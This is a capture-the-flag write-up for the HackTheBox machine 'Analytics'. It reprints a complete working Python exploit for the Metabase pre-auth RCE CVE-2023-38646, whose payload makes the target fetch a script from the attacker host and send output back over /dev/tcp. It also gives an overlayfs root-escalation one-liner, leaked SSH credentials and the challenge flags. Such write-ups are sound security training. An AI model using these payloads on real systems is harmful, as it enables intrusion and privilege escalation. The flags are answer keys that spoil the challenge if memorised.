---
layout: post
title: HTB Analytics Writeup
date: 2024-03-28 21:33:51.958779+06:00
author: animesh
toc: true
tags: ['CVE-2023-38646', 'metabase_rce', 'overlayfs']
categories: ["Hackthebox"]
render_with_liquid: false
comments: true
image:
  path: /posts/htb-analytics-writeup/images/Analytics.png
  alt: HTB Analytics
---

## Overview

Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services. Enumeration of the website reveals a `Metabase` instance, which is vulnerable to Pre-Authentication Remote Code Execution (`[CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)`), which is leveraged to gain a foothold inside a Docker container. Enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. Post-exploitation enumeration reveals that the kernel version that is running on the host is vulnerable to `GameOverlay`, which is leveraged to obtain root privileges.

![Analytics.png](images/Analytics.png)

**Name -** Analytics

**IP -** 10.10.11.233

**Difficulty -** Easy

**OS -** Linux

**Points -** 20

## Information Gathering

### Port Scan

Basic Scan

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-19 03:10 +06
Nmap scan report for 10.10.11.233
Host is up (0.050s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
```

Version Scan

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-19 03:11 +06
Nmap scan report for 10.10.11.233
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds
```

### HTTP Enumeration
The website hosted in analytics.htb looks like the following.

![](images/Pasted%20image%2020240319220113.png)

From the html source, A subdomain was discovered - "data.analytical.htb"

![](images/Pasted%20image%2020240320014120.png)

Visiting that url revealed a metabase URL. I had past experience working with metabase. Its a tool to visualize the data. And it's version can be found here "http://data.analytical.htb/api/session/properties"

![](images/Pasted%20image%2020240320014526.png)

The Version of the Metabase is 0.46.6. 

## Exploit

The version of the metabase is vulnerable with **CVE-2023-38646** (Metabase Pre-Auth RCE). I found this github repo https://www.exploit-db.com/exploits/51797 to exploit this.

```python
# Exploit Title: metabase 0.46.6 - Pre-Auth Remote Code Execution
# Google Dork: N/A
# Date: 13-10-2023
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://www.metabase.com/
# Software Link: https://www.metabase.com/
# Version: metabase 0.46.6
# Tested on: Ubuntu 22.04, metabase 0.46.6
# CVE : CVE-2023-38646

#!/usr/bin/env python3

import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Any
import requests
from socketserver import ThreadingMixIn
import threading
import sys
import argparse
from termcolor import colored
from cmd import Cmd
import re
from base64 import b64decode


class Termial(Cmd):
    prompt = "metabase_shell > "
    def default(self,args):
        shell(args)


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        global success
        if self.path == "/exploitable":
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(f"#!/bin/bash\n$@ | base64 -w 0  > /dev/tcp/{argument.lhost}/{argument.lport}".encode())
            success = True

        else:
            print(self.path)
            #sys.exit(1)
    def log_message(self, format: str, *args: Any) -> None:
        return None

class Server(HTTPServer):
    pass

def run():
    global httpserver
    httpserver = Server(("0.0.0.0", argument.sport), Handler)
    httpserver.serve_forever()

def exploit():
    global success, setup_token
    print(colored("[*] Retriving setup token", "green"))
    setuptoken_request = requests.get(f"{argument.url}/api/session/properties")
    setup_token = re.search('"setup-token":"(.*?)"', setuptoken_request.text, re.DOTALL).group(1)
    print(colored(f"[+] Setup token: {setup_token}", "green"))
    print(colored("[*] Tesing if metabase is vulnerable", "green"))
    payload = {
        "token": setup_token,
        "details":
        {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules":
            {},
            "details":
            {
                "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('http://{argument.lhost}:{argument.sport}/exploitable').openConnection().getContentLength()\n$$--=x\\;",
                "advanced-options": False,
                "ssl": True
                },
                "name": "an-sec-research-musyoka",
                "engine": "h2"
                }
                }
    timer = 0
    print(colored(f"[+] Starting http server on port {argument.sport}", "blue"))
    thread = threading.Thread(target=run, )
    thread.start()
    while timer != 120:
        test = requests.post(f"{argument.url}/api/setup/validate", json=payload)
        if success == True :
            print(colored("[+] Metabase version seems exploitable", "green"))
            break
        elif timer == 120:
            print(colored("[-] Service does not seem exploitable exiting ......", "red"))
            sys.exit(1)

    print(colored("[+] Exploiting the server", "red"))
    

    terminal = Termial()
    terminal.cmdloop()


def shell(command):
    global setup_token, payload2
    payload2 = {
        "token": setup_token,
        "details":
        {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules":
            {},
            "details":
            {
                "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl {argument.lhost}:{argument.sport}/exploitable -o /dev/shm/exec.sh')\n$$--=x",
                "advanced-options": False,
                "ssl": True
                },
                "name": "an-sec-research-team",
                "engine": "h2"
                }
                }
    
    output = requests.post(f"{argument.url}/api/setup/validate", json=payload2)
    bind_thread = threading.Thread(target=bind_function, )
    bind_thread.start()
    #updating the payload
    payload2["details"]["details"]["db"] = f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash /dev/shm/exec.sh {command}')\n$$--=x"
    requests.post(f"{argument.url}/api/setup/validate", json=payload2)
    #print(output.text)


def bind_function():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("0.0.0.0", argument.lport))
        sock.listen()
        conn, addr = sock.accept()
        data = conn.recv(10240).decode("ascii")
        print(f"\n{(b64decode(data)).decode()}")
    except Exception as ex:
        print(colored(f"[-] Error: {ex}", "red"))
        pass
    


if __name__ == "__main__":
    print(colored("[*] Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]", "magenta"))
    args = argparse.ArgumentParser(description="Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]")
    args.add_argument("-l", "--lhost", metavar="", help="Attacker's bind IP Address", type=str, required=True)
    args.add_argument("-p", "--lport", metavar="", help="Attacker's bind port", type=int, required=True)
    args.add_argument("-P", "--sport", metavar="", help="HTTP Server bind port", type=int, required=True)
    args.add_argument("-u", "--url", metavar="", help="Metabase web application URL", type=str, required=True)
    argument  = args.parse_args()
    if argument.url.endswith("/"):
        argument.url = argument.url[:-1]
    success = False
    exploit()
```

By using this exploit, A shell was spawned as the user "metabase".

![](images/Pasted%20image%2020240320021346.png)

After searching for some time, I found the credentials in the environment variable.

![](images/Pasted%20image%2020240320034933.png)

**Creds -** 

> META_USER=metalytics

> META_PASS=An4lytics_ds20223#

## Getting User.txt

Using the creds, I sshed into the box.

![](images/Pasted%20image%2020240320035414.png)

After that I grabbed the User flag - **db7bb5b472a99eb1adea3f2fb84b3458**

![](images/Pasted%20image%2020240320035553.png)

## Getting root.txt

The version of the ubuntu is a bit old

![](images/Pasted%20image%2020240322204002.png)

I found the following vulnerability.
https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/

Got the following payload to exploit the vulnerability from that link

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

After running this payload, I got the root user

![](images/Pasted%20image%2020240322205135.png)

I changed the payload a little bit to get the flag

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cat /root/root.txt")'
```

By running the above command, I got the root flag

![](images/Pasted%20image%2020240322205338.png)

Root Flag - **7f63175fb869f2e3f5e5ee71a2eb0710**

## Flags

**user.txt -** db7bb5b472a99eb1adea3f2fb84b3458

**root.txt -** 7f63175fb869f2e3f5e5ee71a2eb0710